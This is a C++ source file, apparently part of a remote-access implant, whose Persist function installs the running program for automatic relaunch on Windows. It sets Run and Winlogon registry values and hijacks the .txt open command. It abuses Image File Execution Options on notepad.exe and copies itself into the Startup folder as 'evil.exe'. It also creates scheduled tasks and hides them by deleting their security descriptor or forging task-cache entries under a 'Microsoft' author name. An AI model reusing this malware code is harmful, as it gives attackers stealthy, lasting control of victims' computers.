#include "core/task.hpp"

namespace Task
{
    std::wstring Persist(
        State::PSTATE pState,
        const std::wstring& wTechnique,
        const std::wstring& wSchTaskName // It is used for the "scheduled-task" and "ghosttask" techniques.
    ) {
        // Get current program (implant) path.
        WCHAR wSelfPath[MAX_PATH];
        DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
        if (dwResult == 0)
        {
            return L"Error: Failed to get the program path.";
        }

        LPCWSTR lpSelfPath = wSelfPath;

        // Persistence process
        if (wcscmp(wTechnique.c_str(), L"runkey") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            std::wstring wValue = Utils::Random::RandomString(8);
        
            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                wValue.c_str(),
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"user-init-mpr-logon-script") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Environment";
        
            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"UserInitMprLogonScript",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"default-file-extension-hijacking") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"txtfile\\shell\\open\\command";

            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CLASSES_ROOT,
                wSubKey.c_str(),
                0,
                KEY_WRITE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }

            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCR\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"ifeo") == 0)
        {
            // Reference: https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
            HKEY hKey;
            DWORD dwGF = 512;
            DWORD dwRM = 1;

            const WCHAR* wImg = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
            const WCHAR* wSilent = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";

            // GlobalFlag
            if (pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wImg,
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE | KEY_QUERY_VALUE,
                nullptr,
                &hKey,
                nullptr
            ) != ERROR_SUCCESS)
            {
                return L"Error: Failed to create key: Image File Execution Options\\notepad.exe.";
            }
            
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"GlobalFlag",
                0,
                REG_DWORD,
                (const BYTE*)&dwGF,
                sizeof(dwGF)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set key.";
            }
            pState->pProcs->lpRegCloseKey(hKey);

            if (pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wSilent,
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE | KEY_QUERY_VALUE,
                nullptr,
                &hKey,
                nullptr
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to create key: SilentProcessExit\\notepad.exe.";
            }
            
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"ReportingMode",
                0,
                REG_DWORD,
                (const BYTE*)&dwRM,
                sizeof(dwRM)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set ReportingMode.";
            }
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"MonitorProcess",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set MonitorProcess.";
            }

            pState->pProcs->lpRegCloseKey(hKey);
            return L"Success: The entry has been set to HKLM\\" + std::wstring(wImg) + L" and HKLM\\" + std::wstring(wSilent) + L".";
        }
        else if (wcscmp(wTechnique.c_str(), L"scheduled-task") == 0)
        {
            // ------------------------------------------------------------------
            // Create new task
            // ------------------------------------------------------------------

            std::wstring wResult = L"";
            std::wstring wCommand = L"schtasks /create /tn \"" + wSchTaskName + L"\" /sc ONLOGON /tr \"" + std::wstring(lpSelfPath) + L"\"";

            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            RtlZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            RtlZeroMemory(&pi, sizeof(pi));

            if (!pState->pProcs->lpCreateProcessW(
                nullptr,
                &wCommand[0],
                nullptr,
                nullptr,
                FALSE,
                0,
                nullptr,
                nullptr,
                &si,
                &pi
            )) {
                return L"Error: Failed to create process for schtasks.";
            }

            System::Handle::HandleWait(
                pState->pProcs,
                pi.hProcess,
                FALSE,
                nullptr
            );

            // ------------------------------------------------------------------
            // Get exit code
            // ------------------------------------------------------------------

            DWORD dwExitCode;
            if (pState->pProcs->lpGetExitCodeProcess(pi.hProcess, &dwExitCode))
            {
                if (dwExitCode == 0)
                {
                    wResult = L"Success: Task \"" + wSchTaskName + L"\" registered successfully.";
                }
                else if (dwExitCode == 5)
                {
                    wResult = L"Error: Access Denied";
                }
                else
                {
                    wResult = L"Error: Failed to register the task.";
                }
            }
            else
            {
                DWORD dwError = pState->pProcs->lpGetLastError();
                if (dwError == ERROR_ACCESS_DENIED)
                {
                    wResult = L"Error: Access Denied";
                }
                else
                {
                    wResult = L"Error: Failed to register the task.";
                }
            }

            System::Handle::HandleClose(pState->pProcs, pi.hProcess);
            System::Handle::HandleClose(pState->pProcs, pi.hThread);

            // ------------------------------------------------------------------
            // Delete the SD registry key to hide from schtasks command.
            // Reference: https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
            
            // *Currently, the Access Denied error occurs.
            // ------------------------------------------------------------------

            HKEY hKey;
            std::wstring wSubKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\" + wSchTaskName;

            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Warning: Scheduled task set successfully, but could not delete the SD registry key: " + wErrMsg;
            }

            result = pState->pProcs->lpRegDeleteValueW(hKey, L"SD");
            if (result != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Warning: Scheduled task set successfully, but could not delete the SD registry key: " + wErrMsg;
            }

            pState->pProcs->lpRegCloseKey(hKey);

            return wResult;
        }
        else if (wcscmp(wTechnique.c_str(), L"ghosttask") == 0)
        {
            // References:
            // - https://labs.withsecure.com/publications/scheduled-task-tampering
            // - https://github.com/netero1010/GhostTask/blob/main/GhostTask.c

            #define COPY_DATA(dest, src, size) \
                memcpy(dest, src, size); \
                dest += size;

            typedef struct Actions {
                SHORT version;
                DWORD dwAuthorSize; // 0xc
                BYTE author[12];
                SHORT magic;
                DWORD id;
                DWORD dwCmdSize;
                wchar_t* wCmd;
                DWORD dwArgumentSize;
                wchar_t* wArgument;
                DWORD dwWorkingDirectorySize;
                wchar_t* wWorkingDirectory;
                short flags;
            } Actions;

            typedef struct DynamicInfo {
                DWORD dwMagic;
                FILETIME ftCreate;
                FILETIME ftLastRun;
                DWORD dwTaskState;
                DWORD dwLastErrorCode;
                FILETIME ftLastSuccessfulRun;
            } DynamicInfo;

            typedef struct AlignedByte {
                BYTE value;
                BYTE padding[7];
            } AlignedByte;

            typedef struct TSTIME {
                AlignedByte isLocalized;
                FILETIME time;
            } TSTIME;

            // Total size is 0x68
            typedef struct TimeTrigger {
                uint32_t magic;
                DWORD unknown0;
                TSTIME startBoundary;
                TSTIME endBoundary;
                TSTIME unknown1;
                DWORD repetitionIntervalSeconds;
                DWORD repetitionDurationSeconds;
                DWORD timeoutSeconds;
                DWORD mode;
                short data0;
                short data1;
                short data2;
                short pad0;
                byte stopTasksAtDurationEnd;
                byte enabled;
                short pad1;
                DWORD unknown2;
                DWORD maxDelaySeconds;
                DWORD pad2;
                uint64_t triggerId;
            } TimeTrigger;

            // Total size is 0x60
            typedef struct LogonTrigger {
                uint32_t magic;
                DWORD unknown0;
                TSTIME startBoundary;
                TSTIME endBoundary;
                DWORD delaySeconds;
                DWORD timeoutSeconds;
                DWORD repetitionIntervalSeconds;
                DWORD repetitionDurationSeconds;
                DWORD repetitionDurationSeconds2;
                DWORD stopAtDurationEnd;
                AlignedByte enabled;
                AlignedByte unknown1;
                DWORD triggerId;
                DWORD blockPadding;
                AlignedByte skipUser; // 0x00 0x48484848484848
            } LogonTrigger;

            typedef struct Header {
                AlignedByte version;
                TSTIME startBoundary; // The earliest startBoundary of all triggers
                TSTIME endBoundary; // The latest endBoundary of all triggers
            } Header;

            // Local accounts
            typedef struct UserInfoLocal {
                AlignedByte skipUser; // 0x00 0x48484848484848
                AlignedByte skipSid; // 0x00 0x48484848484848
                DWORD sidType; // 0x1
                DWORD pad0; // 0x48484848
                DWORD sizeOfSid;
                DWORD pad1; // 0x48484848
                BYTE sid[12];
                DWORD pad2; // 0x48484848
                DWORD sizeOfUsername; // can be 0
                DWORD pad3; // 0x48484848
            } UserInfoLocal;

            typedef struct OptionalSettings {
                DWORD idleDurationSeconds;
                DWORD idleWaitTimeoutSeconds;
                DWORD executionTimeLimitSeconds;
                DWORD deleteExpiredTaskAfter;
                DWORD priority;
                DWORD restartOnFailureDelay;
                DWORD restartOnFailureRetries;
                GUID networkId;
                // Padding for networkId
                DWORD pad0;
            } OptionalSettings;

            typedef struct JobBucketLocal {
                DWORD flags;
                DWORD pad0; // 0x48484848
                DWORD crc32;
                DWORD pad1; // 0x48484848
                DWORD sizeOfAuthor; // 0xe
                DWORD pad2; // 0x48484848
                BYTE author[12]; // Author
                DWORD pad3;
                DWORD displayName;
                DWORD pad4; // 0x48484848
                UserInfoLocal userInfoLocal;
                DWORD sizeOfOptionalSettings;
                DWORD pad5;
                OptionalSettings optionalSettings;
            } JobBucketLocal;

            typedef struct TriggerLocal {
                Header header;
                JobBucketLocal jobBucketLocal;
                BYTE trigger[];
            } TriggerLocal;

            // ------------------------------------------------------------------
            // Generate random GUID for the task.
            // ------------------------------------------------------------------

            GUID guid = {0};
            RPC_WSTR wGuidStr = nullptr;
            if (pState->pProcs->lpUuidCreate(&guid) != RPC_S_OK)
            {
                return L"Error: Failed to create GUID.";
            }
            if (pState->pProcs->lpUuidToStringW(&guid, &wGuidStr) != RPC_S_OK)
            {
                return L"Error: Failed to convert GUID to string.";
            }

            // Convert RPC_WSTR to wstring
            std::wstring wGuid(reinterpret_cast<wchar_t*>(wGuidStr));
            // Convert  to const BYTE*. This is used for setting values to registry keys.
            const BYTE* lpGuid = reinterpret_cast<const BYTE*>(wGuid.c_str());

            // Get the size
            DWORD dwGuidSize = wGuid.size() * sizeof(wchar_t);

            pState->pProcs->lpRpcStringFreeW(&wGuidStr);

            // ------------------------------------------------------------------
            // Generate SD (Security Descriptor).
            // ------------------------------------------------------------------

            PSECURITY_DESCRIPTOR pSd;
            ULONG dwSdSize;
            if (!pState->pProcs->lpConvertStringSecurityDescriptorToSecurityDescriptorW(
                L"O:BAG:SYD:",
                1,
                &pSd,
                &dwSdSize
            )) {
                return L"Error: Failed to generate the SD.";
            }

            // ------------------------------------------------------------------
            // Prepare subkay paths.
            // ------------------------------------------------------------------

            std::wstring wSubKeyBase = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\";
            std::wstring wSubKeyPlain = wSubKeyBase = L"Plain\\" + wGuid;
            std::wstring wSubKeyTasks = wSubKeyBase + L"Tasks\\" + wGuid;
            std::wstring wSubKeyTree = wSubKeyBase + L"Tree\\" + wSchTaskName;

            // ------------------------------------------------------------------
            // Create subkey 1. Plain
            // ------------------------------------------------------------------

            HKEY hKeyPlain;

            LONG result = pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wSubKeyPlain.c_str(),
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_ALL_ACCESS,
                nullptr,
                &hKeyPlain,
                nullptr
            );
            if (result != ERROR_SUCCESS)
            {
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to create the registry key \"" + wSubKeyPlain + L"\": " + wErrMsg;
            }

            pState->pProcs->lpRegCloseKey(hKeyPlain);

            // ------------------------------------------------------------------
            // Create subkey 2. Tasks
            // ------------------------------------------------------------------

            HKEY hKeyTasks;

            result = pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wSubKeyTasks.c_str(),
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_ALL_ACCESS,
                nullptr,
                &hKeyTasks,
                nullptr
            );
            if (result != ERROR_SUCCESS)
            {
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to create the registry key \"" + wSubKeyTasks + L"\": " + wErrMsg;
            }

            // Prepare data.
            std::wstring wAuthor = L"Microsoft"; // impersonate a legitimage name.
            const BYTE* lpAuthor = reinterpret_cast<const BYTE*>(wAuthor.c_str());
            DWORD dwAuthorSize = wAuthor.size() * sizeof(wchar_t);

            const BYTE* lpSchTaskName = reinterpret_cast<const BYTE*>(wSchTaskName.c_str());
            DWORD dwSchTaskNameSize = wSchTaskName.size() * sizeof(wchar_t);

            std::wstring wDate = L"2021-01-01T00:00:00";
            const BYTE* lpDate = reinterpret_cast<const BYTE*>(wDate.c_str());
            DWORD dwDateSize = wDate.size() * sizeof(wchar_t);

            wchar_t wCmd[256] = {0};
            DWORD dwCmdSize = wcslen(wCmd);

            wchar_t wArgument[256] = {0};
            DWORD dwArgumentSize = wcslen(wArgument);

            wchar_t wWorkingDirectory[256] = {0};
            DWORD dwWorkingDirectorySize = wcslen(wWorkingDirectory);

            Actions* actions = (Actions*)malloc(sizeof(Actions));
            actions->version = 0x3;
            actions->dwAuthorSize = dwAuthorSize;
            memcpy(actions->author, lpAuthor, actions->dwAuthorSize);
            actions->magic = 0x6666;
            actions->id = 0;
            actions->dwCmdSize = dwCmdSize;
            actions->wCmd = wCmd;
            actions->dwArgumentSize = dwArgumentSize;
            actions->wArgument = wArgument;
            actions->dwWorkingDirectorySize = dwWorkingDirectorySize;
            actions->wWorkingDirectory = wWorkingDirectory;
            actions->flags = 0;

            BYTE* actionsRaw = nullptr;
            DWORD dwActionSize;
            dwActionSize = sizeof(SHORT) + sizeof(DWORD) + dwAuthorSize + sizeof(SHORT) + sizeof(DWORD) + sizeof(DWORD) + dwCmdSize + sizeof(DWORD) + dwArgumentSize + sizeof(DWORD) + dwWorkingDirectorySize + sizeof(short);
            actionsRaw = (BYTE*)malloc(dwActionSize);
            BYTE* ptr = actionsRaw;
            COPY_DATA(ptr, &actions->version, sizeof(SHORT));
            COPY_DATA(ptr, &actions->dwAuthorSize, sizeof(DWORD));
            COPY_DATA(ptr, actions->author, actions->dwAuthorSize);
            COPY_DATA(ptr, &actions->magic, sizeof(SHORT));
            COPY_DATA(ptr, &actions->id, sizeof(DWORD));
            COPY_DATA(ptr, &actions->dwCmdSize, dwCmdSize);
            COPY_DATA(ptr, actions->wCmd, sizeof(DWORD));
            COPY_DATA(ptr, &actions->dwArgumentSize, sizeof(DWORD));
            COPY_DATA(ptr, actions->wArgument, dwArgumentSize);
            COPY_DATA(ptr, &actions->dwWorkingDirectorySize, sizeof(DWORD));
            COPY_DATA(ptr, actions->wWorkingDirectory, dwWorkingDirectorySize);
            COPY_DATA(ptr, &actions->flags, sizeof(SHORT));

            AlignedByte empty;
            empty.value = 0;
            memset(empty.padding, 0, 7);

            AlignedByte enable;
            enable.value = 1;
            memset(enable.padding, 0, 7);

            AlignedByte skipSid;
            skipSid.value = 0;
            memset(skipSid.padding, 0x48, 7);

            AlignedByte skipUser;
            skipUser.value = 1;
            memset(skipUser.padding, 0x48, 7);

            AlignedByte version;
            version.value = 0x17;
            memset(version.padding, 0, 7);

            WCHAR wAccountName[256];
            DWORD dwAccountNameSize = sizeof(wAccountName) / sizeof(wAccountName[0]);
            if (!pState->pProcs->lpGetUserNameW(wAccountName, &dwAccountNameSize))
            {
                free(actionsRaw);
                free(actions);
                return L"Error: Failed to get current user name.";
            }
            BYTE wSid[SECURITY_MAX_SID_SIZE];
            DWORD dwSidSize;
            WCHAR wDomainName[256];
            DWORD dwDomainNameSize = sizeof(wDomainName) / sizeof(wDomainName[0]);
            SID_NAME_USE sidType;

            if (!pState->pProcs->lpLookupAccountNameW(
                nullptr,
                wAccountName,
                wSid,
                &dwSidSize,
                wDomainName,
                &dwDomainNameSize,
                &sidType
            )) {
                free(actionsRaw);
                free(actions);
                return L"Error: Failed to lookup account name.";
            }

            SYSTEMTIME st;
            pState->pProcs->lpGetSystemTime(&st);
            FILETIME ft;
            pState->pProcs->lpSystemTimeToFileTime(&st, &ft);
            FILETIME emptyTime;
            emptyTime.dwLowDateTime = 0;
            emptyTime.dwHighDateTime = 0;

            DynamicInfo dynamicInfo;
            dynamicInfo.dwMagic = 0x3;
            dynamicInfo.ftCreate = ft;
            dynamicInfo.ftLastRun = emptyTime;
            dynamicInfo.dwTaskState = 0;
            dynamicInfo.dwLastErrorCode = 0;
            dynamicInfo.ftLastSuccessfulRun = emptyTime;

            TriggerLocal *triggerLocal = nullptr;
            triggerLocal = (TriggerLocal*)malloc(sizeof(TriggerLocal) + sizeof(LogonTrigger));
            TSTIME emptyTstime;
            emptyTstime.isLocalized = empty;
            emptyTstime.time = emptyTime;
            LogonTrigger logonTrigger;
            logonTrigger.magic = 0xaaaa;
            logonTrigger.unknown0 = 0;
            logonTrigger.startBoundary = emptyTstime;
            logonTrigger.endBoundary = emptyTstime;
            logonTrigger.delaySeconds = 0;
            logonTrigger.timeoutSeconds = 0xffffffff;
            logonTrigger.repetitionIntervalSeconds = 0;
            logonTrigger.repetitionDurationSeconds = 0;
            logonTrigger.repetitionDurationSeconds2 = 0;
            logonTrigger.stopAtDurationEnd = 0;
            logonTrigger.enabled = enable;
            logonTrigger.unknown1 = empty;
            logonTrigger.triggerId = 0;
            logonTrigger.blockPadding = 0x48484848;
            logonTrigger.skipUser = skipUser;

            UserInfoLocal userInfoLocal;
            userInfoLocal.skipUser = skipUser;
            userInfoLocal.skipSid = skipSid;
            userInfoLocal.sidType = 0x1;
            userInfoLocal.pad0 = 0x48484848;
            userInfoLocal.sizeOfSid = dwSidSize;
            userInfoLocal.pad1 = 0x48484848;
            memcpy(userInfoLocal.sid, wSid, dwSidSize);
            userInfoLocal.pad2 = 0x48484848;
            userInfoLocal.sizeOfUsername = 0;
            userInfoLocal.pad3 = 0x48484848;

            OptionalSettings optionalSettings;
            optionalSettings.idleDurationSeconds = 0x258;
            // Default value 1 hour
            optionalSettings.idleWaitTimeoutSeconds = 0xe10;
            // Default value 3 days
            optionalSettings.executionTimeLimitSeconds = 0x3f480;
            optionalSettings.deleteExpiredTaskAfter = 0xffffffff;
            // Default value is 7 BELOW_NORMAL_PRIORITY_CLASS
            optionalSettings.priority = 0x7;
            optionalSettings.restartOnFailureDelay = 0;
            optionalSettings.restartOnFailureRetries = 0;
            GUID emptyNetworkId;
            memset(&emptyNetworkId, 0, sizeof(GUID));
            optionalSettings.networkId = emptyNetworkId;
            optionalSettings.pad0 = 0x48484848;

            JobBucketLocal jobBucketLocal;
            jobBucketLocal.flags = 0x42412108;
            jobBucketLocal.pad0 = 0x48484848;
            jobBucketLocal.crc32 = 0;
            jobBucketLocal.pad1 = 0x48484848;
            jobBucketLocal.sizeOfAuthor = 0xe;
            jobBucketLocal.pad2 = 0x48484848;
            memcpy(jobBucketLocal.author, lpAuthor, 12);
            jobBucketLocal.pad3 = 0x48480000;
            jobBucketLocal.displayName = 0;
            jobBucketLocal.pad4 = 0x48484848;
            jobBucketLocal.userInfoLocal = userInfoLocal;
            jobBucketLocal.sizeOfOptionalSettings = 0x2c;
            jobBucketLocal.pad5 = 0x48484848;
            jobBucketLocal.optionalSettings = optionalSettings;

            Header header;
            header.version = version;

            triggerLocal->header = header;
            triggerLocal->jobBucketLocal = jobBucketLocal;
            memcpy(triggerLocal->trigger, &logonTrigger, sizeof(LogonTrigger));

            // Set values.
            if (pState->pProcs->lpRegSetValueExW(hKeyTasks, L"Author", 0, REG_SZ, lpAuthor, dwAuthorSize) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"Author\" in \"" + wSubKeyTasks + L"\": " + wErrMsg;
            }
            if (pState->pProcs->lpRegSetValueExW(hKeyTasks, L"Path", 0, REG_SZ, lpSchTaskName, dwSchTaskNameSize) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"Path\" in \"" + wSubKeyTasks + L"\": " + wErrMsg;
            }
            if (pState->pProcs->lpRegSetValueExW(hKeyTasks, L"URI", 0, REG_SZ, lpSchTaskName, dwSchTaskNameSize) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"URI\" in \"" + wSubKeyTasks + L"\": " + wErrMsg;
            }
            if (pState->pProcs->lpRegSetValueExW(hKeyTasks, L"Date", 0, REG_SZ, lpDate, dwDateSize) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"Date\" in \"" + wSubKeyTasks + L"\": " + wErrMsg;
            }
            if (pState->pProcs->lpRegSetValueExW(hKeyTasks, L"Actions", 0, REG_SZ, actionsRaw, dwActionSize) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"Actions\" in \"" + wSubKeyTasks + L"\": " + wErrMsg;
            }
            if (pState->pProcs->lpRegSetValueExW(hKeyTasks, L"DynamicInfo", 0, REG_BINARY, (LPBYTE)&dynamicInfo, sizeof(dynamicInfo)) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"DynamicInfo\" in \"" + wSubKeyTasks + L"\": " + wErrMsg;
            }
            if (pState->pProcs->lpRegSetValueExW(hKeyTasks, L"Triggers", 0, REG_BINARY, (LPBYTE)triggerLocal, sizeof(triggerLocal) + sizeof(LogonTrigger)) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"Triggers\" in \"" + wSubKeyTasks + L"\": " + wErrMsg;
            }

            pState->pProcs->lpRegCloseKey(hKeyTasks);

            // ------------------------------------------------------------------
            // Create subkey 3. Tree
            // ------------------------------------------------------------------

            HKEY hKeyTree;

            result = pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wSubKeyTree.c_str(),
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_ALL_ACCESS,
                nullptr,
                &hKeyTree,
                nullptr
            );
            if (result != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to create the registry key \"" + wSubKeyTree + L"\": " + wErrMsg;
            }

            // Prepare data.
            LONGLONG index = 3;

            // Set values.
            if (pState->pProcs->lpRegSetValueExW(hKeyTree, L"Index", 0, REG_DWORD, (LPBYTE)index, 4) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"Index\" in \"" + wSubKeyTree + L"\": " + wErrMsg;
            }
            if (pState->pProcs->lpRegSetValueExW(hKeyTree, L"Id", 0, REG_SZ, lpGuid, dwGuidSize) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"Id\" in \"" + wSubKeyTree + L"\": " + wErrMsg;
            }
            if (pState->pProcs->lpRegSetValueExW(hKeyTree, L"SD", 0, REG_BINARY, (LPBYTE)pSd, dwSdSize) != ERROR_SUCCESS)
            {
                free(actionsRaw);
                free(actions);
                free(triggerLocal);
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to \"SD\" in \"" + wSubKeyTree + L"\": " + wErrMsg;
            }

            pState->pProcs->lpRegCloseKey(hKeyTree);

            free(actionsRaw);
            free(actions);
            free(triggerLocal);

            return L"Error: This technique is not supported yet.";
        }
        else if (wcscmp(wTechnique.c_str(), L"startup-folder") == 0)
        {
            // Get a destination path (startup folder + implant).
            std::wstring wAppData = System::Env::EnvStringsGet(pState->pProcs, L"%APPDATA%");
            std::wstring wFileName = L"evil.exe";
            std::wstring wDest = wAppData + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + wFileName;

            // Read the implant data
            std::vector<BYTE> bytes = System::Fs::FileRead(pState->pProcs, std::wstring(lpSelfPath));

            // Copy to startup folder.
            if (!System::Fs::FileWrite(pState->pProcs, wDest, bytes))
            {
                return L"Error: Failed to copy the implant to a startup folder.";
            }
            
            return L"Success: Implant copied to the startup folder \"" + wDest + L"\" successfully.";
        }
        else if (wcscmp(wTechnique.c_str(), L"winlogon") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
            std::wstring wValue = Utils::Random::RandomString(8);

            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                wSubKey.c_str(),
                0,
                KEY_WRITE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to open key: " + wErrMsg;
            }

            std::wstring wExecutables = L"explorer.exe," + std::wstring(wSelfPath);
            LPCWSTR lpExecutables = wExecutables.c_str();
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"Shell",
                0,
                REG_SZ,
                (BYTE*)lpExecutables,
                (wcslen(lpExecutables) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKLM\\" + wSubKey + L".";
            }
            else
            {
                std::wstring wErrMsg = Stdout::GetErrorMessage(result);
                return L"Error: Failed to set value to registry: " + wErrMsg;
            }
        }
        else
        {
            return L"Not implemented yet.";
        }
    }
}